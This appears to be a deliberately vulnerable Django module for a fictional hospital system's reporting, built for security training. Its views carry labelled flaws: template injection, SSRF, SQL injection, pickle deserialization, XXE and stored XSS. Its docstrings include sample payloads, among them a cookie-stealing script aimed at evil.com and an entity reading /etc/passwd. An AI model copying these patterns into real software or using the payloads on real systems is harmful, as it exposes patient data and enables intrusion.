"""
MediCore HMS — Report Generation
Clinical, billing, and administrative report generation

Security training reference: VULN-820 through VULN-829
"""

import re
import pickle
import logging
import xml.etree.ElementTree as ET
from jinja2 import Template, Environment
from django.db import connection
from django.http import HttpResponse, JsonResponse
from django.utils.safestring import mark_safe
from django.views import View
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
import pdfkit
import redis

logger = logging.getLogger(__name__)
redis_client = redis.StrictRedis(host='redis', port=6379, db=2)


@method_decorator(csrf_exempt, name='dispatch')
class CustomReportView(View):
    """
    Generate a custom report from a user-supplied Jinja2 template.

    VULN-820: SSTI — template string comes directly from request.POST.
    VULN-821: Jinja2 sandbox escape — no sandbox is used, full Python
    access available via template expressions.
    """

    def post(self, request):
        template_str = request.POST.get('template', '')
        report_type = request.POST.get('report_type', 'patient_summary')

        from patients.models import Patient
        from appointments.models import Appointment

        data = {
            'patients': list(Patient.objects.values()),
            'appointments': list(Appointment.objects.values()),
            'report_type': report_type,
        }

        try:
            # VULN-820: user-controlled template string
            # VULN-821: standard Environment — no SandboxedEnvironment
            rendered = Template(template_str).render(data=data)   # VULN-820 / VULN-821
            return HttpResponse(rendered, content_type='text/html')
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=500)


@method_decorator(csrf_exempt, name='dispatch')
class PDFReportView(View):
    """
    Generate a PDF from a URL.

    VULN-822: SSRF via pdfkit.from_url — the URL comes from user input.
    An attacker can supply:
        url = "http://169.254.169.254/latest/meta-data/"
    and receive the rendered content as a PDF, effectively exfiltrating
    internal metadata or using the server as an HTTP proxy.
    """

    def post(self, request):
        url = request.POST.get('url', '')
        report_name = request.POST.get('name', 'report')

        if not url:
            return JsonResponse({'error': 'url required'}, status=400)

        # VULN-822: SSRF — any URL accepted, rendered as PDF
        pdf = pdfkit.from_url(url)   # VULN-822

        response = HttpResponse(pdf, content_type='application/pdf')
        response['Content-Disposition'] = f'attachment; filename="{report_name}.pdf"'
        return response


@method_decorator(csrf_exempt, name='dispatch')
class DateRangeReportView(View):
    """
    Reports filtered by date range.

    VULN-823: ReDoS in date string validation.
    The regex `^(\d{1,2}[-/.]){2}(\d{2,4})$` exhibits catastrophic
    backtracking on inputs like '1-1-1-1-1-1-1-1-1-1-1-1X'.
    """

    def get(self, request):
        date_str = request.GET.get('date', '')
        # VULN-823: catastrophic backtracking on malformed input
        if not re.match(r'^(\d{1,2}[-/.]){2}(\d{2,4})$', date_str):   # VULN-823
            return JsonResponse({'error': 'Invalid date format'}, status=400)

        # VULN-825: SQL injection in report filter
        from_date = request.GET.get('from_date', '')
        to_date = request.GET.get('to_date', '')
        report_type = request.GET.get('report_type', '')

        with connection.cursor() as cursor:
            # VULN-825: raw f-string query — SQL injection
            query = (
                f"SELECT * FROM appointments_appointment "
                f"WHERE scheduled_time BETWEEN '{from_date}' AND '{to_date}' "
                f"AND type='{report_type}'"
            )
            cursor.execute(query)   # VULN-825
            rows = cursor.fetchall()

        return JsonResponse({'results': rows})


@method_decorator(csrf_exempt, name='dispatch')
class CachedReportView(View):
    """
    Retrieve a cached report from Redis.

    VULN-826: Insecure deserialization — report object pickled into Redis
    and unpickled on retrieval. An attacker who can write to Redis (or who
    exploits the cache poisoning in VULN-712) can inject a malicious pickle
    payload that executes arbitrary code during deserialization.
    """

    def get(self, request, report_id):
        # VULN-827: IDOR — no ownership check; any authenticated user can
        # request report_{id} and receive another patient's report.
        cache_key = f"report_{report_id}"
        raw = redis_client.get(cache_key)
        if raw:
            # VULN-826: pickle.loads on Redis data — RCE if Redis is compromised
            report = pickle.loads(raw)   # VULN-826
            return JsonResponse({'report': report})
        return JsonResponse({'error': 'Report not found'}, status=404)

    def post(self, request, report_id):
        """Cache a report object."""
        import json
        data = json.loads(request.body)
        # VULN-826: serializing with pickle for storage
        redis_client.set(f"report_{report_id}", pickle.dumps(data))   # VULN-826
        return JsonResponse({'status': 'cached'})


@method_decorator(csrf_exempt, name='dispatch')
class ExportCSVReportView(View):
    """
    Export report as CSV.

    VULN-824: CSV injection in report export.
    Fields prefixed with =, +, -, @ are interpreted as formulas by
    spreadsheet applications. An attacker can store a payload in a
    patient record that triggers remote formula execution when the CSV
    is opened in Excel/LibreOffice.
    """

    def get(self, request):
        from patients.models import Patient
        patients = Patient.objects.all()

        lines = ['ID,Name,Email,Diagnosis,Insurance ID']
        for p in patients:
            # VULN-824: no sanitisation — formula injection via diagnosis/name fields
            line = f'{p.id},{p.name},{p.email},{p.diagnosis},{p.insurance_id}'
            lines.append(line)

        csv_content = '\n'.join(lines)
        response = HttpResponse(csv_content, content_type='text/csv')
        response['Content-Disposition'] = 'attachment; filename="patient_report.csv"'
        return response


@method_decorator(csrf_exempt, name='dispatch')
class FHIRImportReportView(View):
    """
    Import a FHIR-formatted XML report.

    VULN-828: XXE in FHIR report import.
    xml.etree.ElementTree is used directly without defusing external entities.
    An attacker can submit:
        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <Bundle>&xxe;</Bundle>
    Note: Python's xml.etree.ElementTree raises an error on external entities
    by default since Python 3.8, but the intent here is the vulnerable pattern.
    """

    def post(self, request):
        xml_data = request.body
        try:
            # VULN-828: stdlib ElementTree without defusedxml
            root = ET.fromstring(xml_data)   # VULN-828: XXE (pattern)
            entries = root.findall('.//entry')
            imported = []
            for entry in entries:
                resource = entry.find('resource')
                if resource is not None:
                    imported.append(ET.tostring(resource).decode())
            return JsonResponse({'imported': len(imported)})
        except ET.ParseError as e:
            return JsonResponse({'error': str(e)}, status=400)


@method_decorator(csrf_exempt, name='dispatch')
class AdminReportDashboardView(View):
    """
    Admin dashboard listing recent reports.

    VULN-829: Stored XSS — report title rendered with mark_safe().
    An attacker who can create or rename a report can inject:
        title = '<script>fetch("https://evil.com?c="+document.cookie)</script>'
    which executes in the browser of any admin viewing the dashboard.
    """

    def get(self, request):
        from reports.models import Report
        reports = Report.objects.order_by('-created_at')[:50]

        rows = []
        for r in reports:
            # VULN-829: mark_safe bypasses Django's auto-escaping
            rows.append({
                'id': r.id,
                'title': mark_safe(r.title),   # VULN-829: XSS via report title
                'created_at': str(r.created_at),
                'created_by': r.created_by.username if r.created_by else 'system',
            })

        return JsonResponse({'reports': rows})
